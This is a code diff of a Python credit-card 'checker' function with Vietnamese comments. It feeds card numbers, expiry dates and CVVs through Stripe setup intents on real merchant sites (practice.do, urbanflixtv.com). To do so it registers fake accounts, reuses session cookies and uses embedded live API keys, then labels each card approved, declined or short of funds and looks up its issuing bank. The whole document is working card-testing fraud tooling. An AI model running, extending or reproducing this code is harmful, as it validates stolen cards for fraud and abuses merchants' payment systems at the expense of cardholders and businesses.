@@ -16,177 +16,86 @@ HEADERS = {
     "cookie": COOKIES
 }
 
+
+# ========== NHÓM TRẠNG THÁI HIỂN THỊ ========== #
+STATUS_LABELS = {
+    "Success": "✅ Approved",
+    "Failure": "❌ Declined",
+    "Funds": "💸 Insufficient Funds",
+    "CCN": "⚠️ Incorrect CVC",
+    "Custom": "⚠️ 3DS / Action Required",
+    "Unknown": "❓ Unknown",
+}
+
+
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
-    import string, random, time, requests, re, urllib.parse
-
-    def random_email():
-        local = ''.join(random.choices(string.ascii_lowercase, k=19))
-        return f"{local}62@gmail.com"
-
-    def interpret_keycheck_result(status: str, decline_code: str = "") -> str:
-        status = (status or "").lower()
-        decline_code = (decline_code or "").lower()
-
-        if "succeeded" in status:
-            return "Success"
-
-        custom_keys = [
-            "requires_source_action",
-            "requires_action",
-            "requires_payment_method",
-            "requires_confirmation",
-        ]
-        if any(k in status for k in custom_keys):
-            return "Custom"
-
-        failure_keys = [
-            "transaction_not_allowed",
-            "generic_decline",
-            "fraudulent",
-            "live_mode_test_card",
-            "incorrect_number",
-            "card_not_supported",
-            "pickup_card",
-            "processing_error",
-            "do_not_honor",
-            "stolen_card",
-            "invalid_account",
-            "your card was declined",
-            "expiration month is invalid",
-            "expiration year is invalid",
-        ]
-        if decline_code in failure_keys or any(k in status for k in failure_keys):
-            return "Failure"
-
-        if "insufficient_funds" in decline_code:
-            return "Funds"
-
-        if "incorrect_cvc" in decline_code or "invalid_cvc" in decline_code:
-            return "CCN"
-
-        return "Unknown"
-
-    email = random_email()
-    password = "Minhnhat##123"
-    first_name = "Nhat"
-    last_name = "Minh"
     bin_code = cc[:6]
     start_time = time.time()
-
     try:
-        # Step 1: Create user
-        r1 = requests.post(
-            "https://app.practice.do/api/v1/users/create",
-            json={"email": email, "isCoach": True, "password": password, "firstName": first_name, "lastName": last_name},
-            headers={
-                "User-Agent": "Mozilla/5.0",
-                "Pragma": "no-cache",
-                "Accept": "*/*",
-                "Content-Type": "application/json"
-            }
-        )
-        if "Email already in use" in r1.text:
-            return "⚠️ Email already in use. Try again."
-        if "userId" not in r1.text:
-            return "❌ Failed to create user."
+        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
+        soup = BeautifulSoup(r1.text, "html.parser")
+        token_tag = soup.find("meta", {"name": "csrf-token"})
+        if not token_tag:
+            return "❌ Không lấy được CSRF token."
 
-        # Step 2: Firebase login
-        r2 = requests.post(
-            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
-            json={"returnSecureToken": True, "email": email, "password": password, "clientType": "CLIENT_TYPE_WEB"},
-            headers={
-                "User-Agent": "Mozilla/5.0",
-                "Pragma": "no-cache",
-                "Accept": "*/*",
-                "Content-Type": "application/json"
-            }
-        )
-        tk = r2.json().get("idToken")
-        if not tk:
-            return "❌ Firebase login failed."
+        # Retry tối đa 5 lần nếu lỗi setup_intent
+        setid = ""
+        for attempt in range(5):
+            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
+            if r2.status_code == 200:
+                try:
+                    setid = r2.json().get("setup_intent", "")
+                    if setid:
+                        break
+                except Exception:
+                    pass
+            time.sleep(1)
+        if not setid:
+            return "❌ Lỗi lấy setup_intent (sau 5 lần thử)"
 
-        # Step 3: SetupIntent
-        r3 = requests.post(
-            "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
-            headers={
-                "host": "app.practice.do",
-                "accept": "application/json, text/plain, */*",
-                "accept-language": "vi-VN",
-                "cache-control": "no-cache",
-                "origin": "https://app.practice.do",
-                "pragma": "no-cache",
-                "user-agent": "Mozilla/5.0",
-                "cookie": f"firebase_token={tk}",
-                "content-type": "application/x-www-form-urlencoded"
-            },
-            data=""
-        )
-        src = r3.text
-        match = re.search(r'"clientSecret":"(.*?)"', src)
-        if not match:
-            return "❌ Không lấy được clientSecret."
-        client_secret = match.group(1)
-        intent_id = client_secret.split("_secret_")[0]
+        setin = setid.split("_secret_")[0]
 
-        encoded_email = urllib.parse.quote(email)
-        payload = f"return_url=https%3A%2F%2Fapp.practice.do%2Fstart-trial%3Fstep%3D2%26email%3D{encoded_email}&" \
-                  f"payment_method_data[type]=card&" \
-                  f"payment_method_data[card][number]={cc}&" \
-                  f"payment_method_data[card][cvc]={cvv}&" \
-                  f"payment_method_data[card][exp_year]={ano}&" \
-                  f"payment_method_data[card][exp_month]={mes}&" \
-                  f"payment_method_data[billing_details][address][country]=VN&" \
-                  f"use_stripe_sdk=true&" \
-                  f"key=pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE&" \
-                  f"client_secret={client_secret}"
+        payload = {
+            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
+            "payment_method_data[type]": "card",
+            "payment_method_data[card][number]": cc,
+            "payment_method_data[card][cvc]": cvv,
+            "payment_method_data[card][exp_year]": ano,
+            "payment_method_data[card][exp_month]": mes,
+            "payment_method_data[billing_details][address][country]": "VN",
+            "use_stripe_sdk": "true",
+            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
+            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
+            "client_secret": setid
+        }
 
-        r4 = requests.post(
-            f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm",
-            headers={
-                "User-Agent": "Mozilla/5.0",
-                "Pragma": "no-cache",
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded"
-            },
-            data=payload
-        )
-        j4 = r4.json()
-        status = j4.get("status", "UNKNOWN")
-        decline = j4.get("error", {}).get("decline_code", "NONE")
+        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
+        j3 = r3.json()
+        status = j3.get("status", "UNKNOWN")
+        decline = j3.get("error", {}).get("decline_code", "NONE")
 
-        # keycheck
-        result_group = interpret_keycheck_result(status, decline)
-        label = {
-            "Success": "✅ Approved",
-            "Failure": "❌ Declined",
-            "Funds": "💸 Insufficient Funds",
-            "CCN": "⚠️ Incorrect CVC",
-            "Custom": "⚠️ 3DS / Action Required",
-            "Unknown": "❓ Unknown"
-        }.get(result_group, "❓ Unknown")
-
-        # BIN lookup
-        bin_info = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}").json()
-        scheme = bin_info.get("scheme", "N/A")
-        type_ = bin_info.get("type", "N/A")
-        brand = bin_info.get("brand", "N/A")
-        country = bin_info.get("country", {}).get("alpha2", "N/A")
-        bank = bin_info.get("bank", {}).get("name", "N/A")
+        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
+        bin_json = bin_res.json()
+        card = bin_json.get("scheme", "N/A")
+        type_ = bin_json.get("type", "N/A")
+        brand = bin_json.get("brand", "N/A")
+        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
+        bank = bin_json.get("bank", {}).get("name", "N/A")
 
         elapsed = round(time.time() - start_time, 2)
         return f"""
 <b>✅ CHECK RESULT</b>
 
 <b>CC:</b> {cc}|{mes}|{ano}|{cvv}
-<b>Status:</b> {label}
-<b>Decline Code:</b> {decline.upper() if decline else "NONE"}
+<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
+<b>Decline Code:</b> {decline}
 
-<b>Gateway:</b> Stripe (Practice.do)
-<b>Card:</b> {scheme.upper()}
+<b>Gateway:</b> Stripe
+<b>Card:</b> {card.upper()}
 <b>Type:</b> {type_.capitalize()}
 <b>Brand:</b> {brand}
-<b>Alpha2:</b> {country}
+<b>Alpha2:</b> {alpha2}
 <b>Bank:</b> {bank}
 
 <b>Took:</b> {elapsed} sec
